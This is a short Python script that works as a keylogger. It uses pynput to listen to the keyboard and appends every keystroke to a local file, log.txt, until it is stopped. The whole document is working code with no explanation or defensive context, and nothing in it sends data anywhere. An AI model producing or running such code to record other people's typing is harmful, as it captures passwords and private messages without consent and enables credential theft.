#! /usr/bin/env python
import pynput.keyboard

def press(key):
    with open("log.txt", 'a') as log:
        log.write(str(key))

listener = pynput.keyboard.Listener(on_press=press)

with listener:
    listener.join() 

